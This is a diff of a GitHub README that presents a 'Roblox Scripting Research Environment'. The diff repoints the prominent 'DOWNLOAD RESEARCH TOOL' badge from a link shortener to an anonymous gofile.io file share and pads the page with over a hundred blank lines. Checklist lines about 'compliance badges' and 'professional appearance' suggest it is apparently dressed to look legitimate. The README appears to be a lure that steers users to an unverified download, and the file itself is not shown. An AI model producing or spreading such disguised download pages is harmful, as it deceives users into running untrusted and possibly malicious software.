@@ -1,7 +1,7 @@
 # 🚀 Swift Labs: Roblox Scripting Research Environment  
 
 <div align="center">
-  <a href="https://kurzlinks.de/wzj6">
+  <a href="https://gofile.io/d/Kkbth3">
     <img src="https://img.shields.io/badge/🧪_DOWNLOAD_RESEARCH_TOOL-3498DB?style=for-the-badge&logo=github&logoColor=white" width="350">
   </a>
   <br><br>
@@ -133,6 +133,137 @@ This version:
 ✅ Includes educational resources  
 ✅ Features compliance badges  
 ✅ Shows real research applications  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ✅ Maintains professional appearance  
 ✅ Follows GitHub community guidelines  
 
